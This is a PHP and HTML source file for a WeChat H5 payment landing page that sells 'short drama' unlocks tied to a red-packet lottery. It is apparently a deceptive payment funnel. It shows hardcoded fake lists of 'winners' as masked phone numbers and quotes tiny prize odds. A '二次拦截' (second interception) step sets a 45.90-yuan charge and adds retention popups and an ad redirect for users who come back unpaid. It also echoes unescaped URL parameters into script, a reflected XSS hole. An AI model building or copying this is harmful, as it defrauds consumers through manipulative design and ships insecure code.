    <?php
/**
 * 微信 H5 支付 PHP 版本 demo 部分代码来自网络
 * 作者：沈唁
 * 博客：https://qq52o.me
 */
require_once("const.php");
require_once("inc/db.class.php");
# 微信支付
$clickid='';
if (count($_GET)>0){
	$clickid = $_GET['qcjParamStr'];
	$number = $_GET['_num'];
}
$userip = get_client_ip();     //获得用户设备 IP
$mch_id = $mch['data']['mch_id'];                  //微信支付商户号
$key    = $mch['data']['mch_key'];                    //微信商户 API 密钥
$domain = $mch['data']['mch_domain'];
$out_trade_no = date('YmdHis').rand(1000,9999);//平台内部订单号
$nonce_str = createNoncestr();//随机字符串
$body = "TEL：18704551088 工作日：9:00 17:30 NO.".rand(100000,999999);//内容
$attach = $mch;// 额外参数
if($number >= 1){
    $money = 4590;// 二次拦截
}
$total_fee = $money; //金额
$spbill_create_ip = $userip; //IP
$notify_url = "https://".$domain."/zhifu/notify.php"; //回调地址
$trade_type = 'MWEB';//交易类型 具体看 API 里面有详细介绍
$scene_info ='{"h5_info":{"type":"Wap","wap_url":"http://qq52o.me","wap_name":"支付"}}';//场景信息 必要参数
$signA ="appid=$appid&attach=$attach&body=$body&mch_id=$mch_id&nonce_str=$nonce_str&notify_url=$notify_url&out_trade_no=$out_trade_no&scene_info=$scene_info&spbill_create_ip=$spbill_create_ip&total_fee=$total_fee&trade_type=$trade_type";
$strSignTmp = $signA."&key=$key"; // 拼接字符串
$sign = strtoupper(MD5($strSignTmp)); // MD5 后转换成大写
$post_data = "<xml>
                    <appid>$appid</appid>
                    <mch_id>$mch_id</mch_id>
                    <body>$body</body>
                    <out_trade_no>$out_trade_no</out_trade_no>
                    <total_fee>$total_fee</total_fee>
                    <spbill_create_ip>$spbill_create_ip</spbill_create_ip>
                    <notify_url>$notify_url</notify_url>
                    <trade_type>$trade_type</trade_type>
                    <scene_info>$scene_info</scene_info>
                    <attach>$attach</attach>
                    <nonce_str>$nonce_str</nonce_str>
                    <sign>$sign</sign>
            </xml>";//拼接成 XML 格式
$url = "https://api.mch.weixin.qq.com/pay/unifiedorder";//微信传参地址
$total = check_third_order($connect);
if ($total < 3){
    $dataxml = postXmlCurl($post_data, $url, $out_trade_no, $domain); //后台 POST 微信传参地址  同时取得微信返回的参数
    $objectxml = (array) simplexml_load_string($dataxml, 'SimpleXMLElement',LIBXML_NOCDATA);
}

$json_file = json_decode(file_get_contents('map.json'), true);
if(count($json_file) >= 1200){
    $json_file = array_slice($json_file, 400);
}
$current = ['key' => $out_trade_no, 'value' => $clickid];
$json_file[count($json_file)] = $current;
file_put_contents('map.json',json_encode((object) $json_file));
?>

<!DOCTYPE html>
<html lang="en">
<head>
<link rel="stylesheet" href="images/vendor-4a7d7eee.css">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests" />
<meta charset="UTF-8">
    <title>看剧福利</title>
    <meta name="viewport" content="maximum-scale=1.0,minimum-scale=1.0,user-scalable=0,initial-scale=1.0,width=device-width">
    <script src="images/jquery.min.js"></script>
    <script>
        document.write('<link rel="stylesheet" href="css/index.css?_='+Math.random()+'">')
        document.write('<script src="js/Config.js?_='+Math.random()+'"><'+'/script>')
        document.write('<script src="js/index.js?_='+Math.random()+'"><'+'/script>')
    </script>

<link rel="stylesheet" href="images/index.css">

<script src="images/index.js"></script>
    <script src="images/vue.min.js"></script>
    <script src="images/vant.min.js"></script>
    <!--    axios-->
    <script src="images/axios.min.js"></script>
    <!-- vue-cookie -->
    <script src="images/vue-cookies.js"></script>
	<script src="http://libs.baidu.com/jquery/2.1.4/jquery.min.js"></script>
</head>
<body>
<div class="container">
    <div class="box_column">
        <div class="bg">
            <div class="rule" onclick="open_rule()"><img src="images/rule.png"> </div>
            <div class="kefu"><a  href="tel:18704551088" target="_blank"><img src="images/kefu.png"></a> </div>
            <div class="refund"><a href="https://<?php echo $domain;?>/zhifu/svRefund/svRefund.php">极速退款</a> </div>
            <div class="price">&nbsp;&nbsp;</div>
            <div class="content">
                <div style="position:relative">
                    <div class="maoScroll-main">
                        <ul class=" rowup" style="margin-top: -154px; transition: all 0.5s ease 0s;"><li><img src="images/10.png"> 198****6163 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/04.png"> 188****2218 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/03.png"> 145****6296 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/02.png"> 151****9037 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/09.png"> 131****5038 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/07.png"> 138****4412 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/10.png"> 176****1308 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/11.png"> 186****4975 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/10.png"> 183****3048 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/07.png"> 178****1339 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/03.png"> 153****5096 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/04.png"> 183****1587 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/02.png"> 147****3974 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/09.png"> 180****1090 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/01.png"> 187****6564 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/03.png"> 145****4809 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/09.png"> 141****1608 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/03.png"> 145****5226 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/10.png"> 149****4259 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li><li><img src="images/01.png"> 166****4822 <span class="text"><span class="yldj">已经领取看短剧</span><span class="chb">抽红包福利</span></span></li></ul>
                    </div>

              </div>
                <div class="submit my_xing"> <a href="<?php echo $objectxml['mweb_url'] ?>"><img src="images/submit.png"></a>  </a>
              </div>
                <div class="company">北京数慧生活科技有限公司<br> 客服电话：18704551088 <br>京ICP备2022030573号- 6</div>
            </div>
            <div class="pop-win">
                <div class="rule_content">
                    <div class="title">活动规则</div>
                    <div class="cont"><span>解锁短剧剧情费用说明：本链接下49.9元为"数慧社区"微信公众号平台的20集剧情解锁费用，非商品直购费用，成功解锁短剧剧情即可参与抽888元红包机会（每人每日只能参与一次）。
                    <br>					猜中剧情即有机会获得幸运奖〜每天每人限参与 1次，1次机会免费。此活动为概率中奖，奖品数量有限，祝好运！
                    <br>					【中奖概率说明】
                    <br>					惊喜一：888元红包手机共10份，中奖概率十万分之1
                    <br>					惊喜二：66元红包共10份，中奖概率五万分之1
                    <br>					惊喜三：20元红包共10份，中奖概率五万分之1
                    <br>					惊喜四：随机奖励，中奖概率十分之1
                    <br>					以上奖品，每人每天限领取1次
                    <br>					【特殊说明】
                    <br>					本活动为用户自愿参与，活动主办方为北京数慧生活科技有限公司，
                    <br>					在活动中获得道具、奖品后，如退出活动，可能导致道具或奖品丢失，请在获得道具、奖品后及时兑换或领取，避免损失。
                    <br>					【活动参与方式】
                    <br>					1.点击消息中的公众号链接#公众号：数慧社区，进入下一个页面
                    <br>					2.点击关注按钮关注公众号：数慧社区
                    <br>					3.点击公众号中推送的相关链接进行短剧观看 以及手机抽取
                    <br>					
                    <br>					如付费后不想参与活动，可联系在线客服或者通过“自助退款”入口退款</span></div>
                    <div class="operate" onclick="close_rule()"><img src="images/close.png"> </div>
                </div>
            </div>
            <div class="pop-wl">
                <div class="pon-win-1" style="display: none">
                    <div class="bg1">
                        <div class="submit2">
                            <img src="images/短剧挽留.png">
                        </div>
                    </div>
                    <!--<div class="close2"="open_ad()"><img src="images/close2.png"> </div>-->
                    <div id="close" class="close2" style="cursor: pointer;"> <img src="images/close2.png"> </div>
                </div>
                <div class="pon-win-2" style="display: none">
                    <div class="bg2"="goto_ad()">
                        <img src="images/adv_ta.gif">
                    </div>
                    <div id="close2" class="close2"="goto_ad()"><img src="images/close2.png"> </div>
                </div>
            </div>
        </div>
    </div>

    <uni-view hidden="" id="fail" data-v-640cd216="" data-v-7a41c382="" class="uni-popup center">
        <uni-view
            data-v-640cd216="">
            <uni-view data-v-289169e0="" data-v-640cd216="" class="" name="mask"
                      style="opacity: 1; position: fixed; inset: 0px; background-color: rgba(0, 0, 0, 0.4); transition: opacity 300ms ease 0ms, -webkit-transform 300ms ease 0ms, transform 300ms ease 0ms; transform-origin: 50% 50%;"></uni-view>
            <uni-view
                data-v-289169e0="" data-v-640cd216="" class="" name="content"
                style="transform: scale(1); opacity: 1; position: fixed; display: flex; flex-direction: column; inset: 0px; justify-content: center; align-items: center; transition: opacity 300ms ease 0ms, -webkit-transform 300ms ease 0ms, transform 300ms ease 0ms; transform-origin: 50% 50%;">
                <uni-view
                    data-v-640cd216="" class="uni-popup__wrapper center"
                    style="background-color: transparent;">
                    <uni-view data-v-7a41c382="" class="box_column"
                              style="align-items: center; background-color: white; border-radius: 16px; width: 334px; padding-bottom: 24px;">
                        <uni-text
                            data-v-7a41c382=""
                            style="color: rgb(10, 10, 10); font-size: 24px; font-weight: bold; margin-top: 47px;">
                            <span>申请订单失败</span></uni-text>
                        <img style="width: 102px; height: 102px; margin-top: 24px;" src="./svRefund/h61.amkj.store_pages_refund_svRefund_files/ic_fail.123f7583.png">
                        <uni-text data-v-7a41c382=""
                                  style="color: rgb(10, 10, 10); font-size: 20px; margin-top: 36px; padding-left: 20px; padding-right: 19px;text-align:center;">
                            <span>今天您的订单已超过三笔<br>请明天再来</span>
                            <span style="color: rgb(255, 0, 0); font-weight: bold;">内容依旧火爆</span>
                        </uni-text>
                        <img id="fail_know" style="width: 275px; height: 52px; margin-top: 47px;" src="./svRefund/h61.amkj.store_pages_refund_svRefund_files/iknow.png">
                    </uni-view>
                </uni-view>
            </uni-view>
        </uni-view>
    </uni-view>
    
    <div id="result">
        <div class="van-overlay" style="z-index: 2001;"></div>
        <div role="dialog" tabindex="0" class="van-popup van-popup--center van-dialog" aria-labelledby="抽奖提示"style="z-index: 2001;">
        <div class="van-dialog__header">抽奖提示</div>
        <div class="van-dialog__content">
            <div class="van-dialog__message van-dialog__message--has-title">是否已经支付？</div>
        </div>
        <div class="van-hairline--top van-dialog__footer">
            <button type="button" id="noPay" class="van-button van-button--default van-button--large van-dialog__cancel">
                <div class="van-button__content"><span class="van-button__text">未支付</span></div>
            </button>
            <button type="button" id="isPay" class="van-button van-button--default van-button--large van-dialog__confirm van-hairline--left">
                <div class="van-button__content"><span class="van-button__text">已支付</span></div>
            </button>
        </div>
    </div>
</div>
<script>
        let num = <?php echo $number?>;
        let total = <?php echo $total?>;
        let out_trade_no = "<?php echo $out_trade_no?>";
        let domain = "<?php echo $domain?>";
        document.getElementById("result").style.display = "none";
        document.getElementById('isPay').addEventListener('click', function(){
            location.href = "https://"+domain+"/zhifu1/trans.php?mode=1&out_trade_no="+out_trade_no;
        });
        document.getElementById('noPay').addEventListener('click', function(){
            location.href = "https://"+domain+"/zhifu1/?_num=1";
        });
        document.addEventListener("visibilitychange", function () {
            if (!document.hidden) {
                document.getElementById("result").style.display = "flex";
                $.get("https://"+domain+"/zhifu/trans.php?mode=2&out_trade_no="+out_trade_no)
            }
        });
        
        // 第一次未支付
        if(num >= 1){
            $('.pop-wl').css('display','flex');
            $('.pon-win-1').show();
        }
        // 第二次未支付
        if (total < 3){
            $('.submit2').on('click', function() {
                let href = "<?php echo $objectxml['mweb_url']?>";
                var a = document.createElement('a');
                a.setAttribute('href', href);
                document.body.appendChild(a);
                a.click();
            })
        }else{
            $('.pop-wl').css('display','flex');
            $('#fail').show();
        }
        $('#close').on('click',function (){
            $('.pon-win-1').hide();
            $('.pon-win-2').show();
        })
        $('.pon-win-2').on('click',function (){
            location.href = 'https://u.tuiabcedc.cn/2c84';
        })
        
        
        $('.pop-close').click(function () {
            $('.bgPop,.pop').hide();
        });
        $('.click_pop').click(function () {
			setTimeout(function(){ $('.bgPop,.pop').show(); },2000)
        });
        
</script>
<script>
        $('.pop-close1').click(function () {
            $('.bgPop1,.pop1').hide();
        });
        $('.click_pop1').click(function () {
			setTimeout(function(){ $('.bgPop1,.pop1').show(); },2000)
        });
</script>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?ae8261a3a08d3009711d360d148e0794";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>
</body>

</html>